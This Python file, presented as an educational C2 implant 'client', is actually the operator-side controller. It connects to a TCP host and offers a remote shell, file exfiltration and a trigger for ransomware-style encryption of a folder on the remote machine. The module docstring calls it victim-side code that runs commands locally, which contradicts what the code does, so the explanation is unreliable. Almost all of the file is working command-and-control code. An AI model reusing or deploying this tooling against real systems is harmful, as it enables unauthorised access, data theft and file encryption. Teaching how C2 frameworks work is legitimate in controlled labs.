"""
client.py — C2 Implant Simulation (Victim-Side) — Educational Framework.

This module simulates the 'victim-side' of a C2 framework. In a real attack,
this script (or a compiled version of it) would run on the compromised machine
and 'beacon back' to the attacker's server to receive instructions.

It demonstrates three capabilities commonly found in real C2 implants:

    Mode 0 — Remote Shell
        The implant sends shell commands received from the operator to the
        local OS and streams the output back. This gives the attacker an
        interactive terminal on the victim machine.

    Mode 1 — File Exfiltration
        The operator specifies a filename. The implant locates it and streams
        it back to the server with SHA-256 integrity verification, simulating
        data theft (e.g., stealing SSH keys, documents, or config files).

    Mode 2 — Ransomware Simulation
        The implant triggers Fernet encryption on a 'dummy_targets/' directory.
        Restricted to that directory only — safe for demonstration.

Design notes:
    - The Client class uses Rich for styled terminal output (progress bars,
      colored panels, emoji indicators) to make the demo visually clear.
    - private methods (__double_underscore) enforce Python name mangling,
      meaning they truly cannot be called from outside the class — a good
      OOP practice for methods that should only be used internally.
    - The 'contact()' method is the session manager: it shows the menu,
      sends the mode byte, reads the server's acknowledgement, then
      dispatches to the right private handler.

Usage:
    python client.py [host] [port]
    Defaults: localhost:8080
"""

import hashlib
import json
import os
import socket
import sys

from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, DownloadColumn, Progress, TextColumn, TimeRemainingColumn
from rich.table import Table
import questionary

CHUNK_SIZE  = 4096   # bytes per recv call — must match server
RECV_BUFFER = 1024   # for control messages

BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗         ║
║    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗        ║
║    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝        ║
║    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗        ║
║    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║        ║
║    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝        ║
║                                                              ║
║           C O N T R O L L E R   [Educational]               ║
╚══════════════════════════════════════════════════════════════╝
"""


class Client:
    """
    Simulates a C2 implant running on a victim machine.

    Manages the socket lifecycle and exposes three operational modes.
    All private handler methods follow the naming convention __method()
    to make them inaccessible from outside the class.

    Attributes:
        _host (str):          C2 server IP or hostname.
        _port (int):          C2 server TCP port.
        _socket (socket):     The active TCP connection to the server.
        console (Console):    Rich console for styled output.
    """

    def __init__(self, host: str = "localhost", port: int = 8080):
        self._host = host
        self._port = port
        self._socket: socket.socket | None = None
        self.console = Console()

    # ── Public interface ──────────────────────────────────────────────────────

    def start(self) -> None:
        """
        Display the banner, connect to the server, run the session, then clean up.

        This is the only public method an external caller needs — it's the full
        lifecycle of one C2 session from connection to teardown.
        """
        self.console.print(BANNER, style="bold cyan")
        self.__connect()
        self.contact()
        self.__disconnect()

    def contact(self) -> None:
        """
        Present the mode selection menu and dispatch to the chosen handler.

        Sends the mode index (as a string byte) to the server, reads the
        server's acknowledgement message, then calls the appropriate private
        method. Wraps everything in connection error handling.
        """
        try:
            mode_map = {
                "[ 0 ]  Remote Shell          — Execute commands on victim OS":   "0",
                "[ 1 ]  File Exfiltration     — Download a file from the victim": "1",
                "[ 2 ]  Ransomware Simulation — Encrypt/decrypt dummy_targets/":  "2",
            }
            answer = questionary.select(
                "Select operation mode:",
                choices=list(mode_map.keys()),
            ).ask()

            if answer is None:
                self.console.print("[yellow]No selection made. Exiting.[/]")
                return

            mode = mode_map[answer]
            self._socket.sendall(mode.encode())

            # Read server acknowledgement
            ack = self._socket.recv(RECV_BUFFER).decode().strip()
            self.console.print(Panel(ack, style="bold green", expand=False))

            if mode == "0":
                self.__remote_shell()
            elif mode == "1":
                self.__file_exfiltration()
            elif mode == "2":
                self.__ransomware_simulation()

        except ConnectionResetError:
            self.console.print("[bold red][!] Connection was reset by the server.[/]")
        except ConnectionAbortedError:
            self.console.print("[bold red][!] Connection was aborted.[/]")
        except BrokenPipeError:
            self.console.print("[bold red][!] Server closed the connection unexpectedly.[/]")
        except Exception as e:
            self.console.print(f"[bold red][!] Unexpected error: {e}[/]")

    # ── Private: connection management ────────────────────────────────────────

    def __connect(self) -> None:
        """Create a TCP socket and connect to the C2 server."""
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self._socket.connect((self._host, self._port))
            self.console.print(
                f"[bold green][+] Connected to C2 server at {self._host}:{self._port}[/]"
            )
        except ConnectionRefusedError:
            self.console.print(
                f"[bold red][!] Cannot connect to {self._host}:{self._port}. "
                f"Is the server running?[/]"
            )
            sys.exit(1)

    def __disconnect(self) -> None:
        """Cleanly close the socket if it is open."""
        if self._socket:
            self._socket.close()
            self.console.print("[dim][-] Connection closed.[/]")

    # ── Private: Mode 0 — Remote Shell ───────────────────────────────────────

    def __remote_shell(self) -> None:
        """
        Interactive remote shell loop.

        Sends each command the operator types to the server and prints
        the server's response. The loop ends when the operator types 'exit'.
        """
        self.console.print(
            "[bold yellow]Remote shell active. Commands run on the server OS.[/]\n"
            "[dim]Type 'exit' to end the session.[/]\n"
        )

        while True:
            try:
                command = input("  shell >> ").strip()
            except (EOFError, KeyboardInterrupt):
                command = "exit"

            if not command:
                continue

            self._socket.sendall(command.encode())

            if command.lower() == "exit":
                # Read the server's final message
                response = self._socket.recv(RECV_BUFFER).decode(errors="replace")
                self.console.print(f"[dim]{response}[/]")
                break

            # Receive full response (may be larger than RECV_BUFFER for long output)
            response = self.__recv_all()
            self.console.print(response)

    # ── Private: Mode 1 — File Exfiltration ──────────────────────────────────

    def __file_exfiltration(self) -> None:
        """
        Request a file from the server and save it locally.

        Reads a JSON metadata packet to learn the filename, size, and hash,
        then receives the raw bytes in chunks and verifies integrity with SHA-256.
        """
        filename = input("\n  Enter filename to exfiltrate: ").strip()
        if not filename:
            self.console.print("[yellow]No filename provided.[/]")
            return

        self._socket.sendall(filename.encode())

        # Receive metadata (JSON line terminated by '\n')
        raw_meta = b""
        while not raw_meta.endswith(b"\n"):
            chunk = self._socket.recv(RECV_BUFFER)
            if not chunk:
                break
            raw_meta += chunk

        try:
            meta = json.loads(raw_meta.decode().strip())
        except json.JSONDecodeError:
            self.console.print("[red][!] Invalid metadata received from server.[/]")
            return

        # Check for server-side error
        if "error" in meta:
            self.console.print(f"[bold red][!] Server: {meta['error']}[/]")
            return

        # Display file info
        info_table = Table(show_header=False, box=None, padding=(0, 2))
        info_table.add_row("[cyan]Filename[/]", meta["filename"])
        info_table.add_row("[cyan]Size[/]",     f"{meta['filesize']:,} bytes")
        info_table.add_row("[cyan]SHA-256[/]",  meta["sha256"])
        self.console.print(Panel(info_table, title="File Info", expand=False))

        # Acknowledge and receive
        self._socket.sendall(b"OK")

        received = b""
        filesize = meta["filesize"]

        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            DownloadColumn(),
            TimeRemainingColumn(),
        ) as progress:
            task = progress.add_task(f"  Receiving {meta['filename']}...", total=filesize)

            while len(received) < filesize:
                chunk = self._socket.recv(CHUNK_SIZE)
                if not chunk:
                    break
                received += chunk
                progress.update(task, advance=len(chunk))

        # Save file
        save_path = os.path.join("received_files", meta["filename"])
        os.makedirs("received_files", exist_ok=True)
        with open(save_path, "wb") as f:
            f.write(received)

        # Verify integrity
        received_hash = hashlib.sha256(received).hexdigest()
        if received_hash == meta["sha256"]:
            self.console.print(
                f"[bold green][✔] File saved to '{save_path}'. Integrity verified.[/]"
            )
        else:
            self.console.print(
                f"[bold red][✘] Integrity check FAILED!\n"
                f"    Expected : {meta['sha256']}\n"
                f"    Got      : {received_hash}[/]"
            )

    # ── Private: Mode 2 — Ransomware Simulation ───────────────────────────────

    def __ransomware_simulation(self) -> None:
        """
        Trigger file encryption or decryption on the server's dummy_targets/ directory.

        Lets the operator choose between 'encrypt' and 'decrypt', sends the
        operation string to the server, then receives and prints the results.
        """
        answer = questionary.select(
            "Choose operation:",
            choices=[
                "encrypt — Lock files in dummy_targets/",
                "decrypt — Unlock files (simulate key delivery)",
            ],
        ).ask()

        if answer is None:
            self.console.print("[yellow]No selection. Returning.[/]")
            return

        operation = "encrypt" if answer.startswith("encrypt") else "decrypt"
        self._socket.sendall(operation.encode())

        self.console.print(
            f"\n[bold yellow]  Ransomware simulation: [cyan]{operation.upper()}[/][/]\n"
        )

        result = self.__recv_all()
        self.console.print(result)

    # ── Private: utility ──────────────────────────────────────────────────────

    def __recv_all(self, timeout: float = 1.0) -> str:
        """
        Receive the full server response, handling multi-packet messages.

        Sets a socket timeout so we stop reading after the server goes quiet
        for 'timeout' seconds. This avoids blocking forever on large outputs.

        Args:
            timeout: Seconds to wait for the next packet before stopping.

        Returns:
            The complete response as a decoded string.
        """
        self._socket.settimeout(timeout)
        chunks = []
        try:
            while True:
                chunk = self._socket.recv(CHUNK_SIZE)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass  # No more data — normal end-of-response
        finally:
            self._socket.settimeout(None)  # Restore blocking mode

        return b"".join(chunks).decode(errors="replace")


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    client = Client(host=host, port=port)
    client.start()
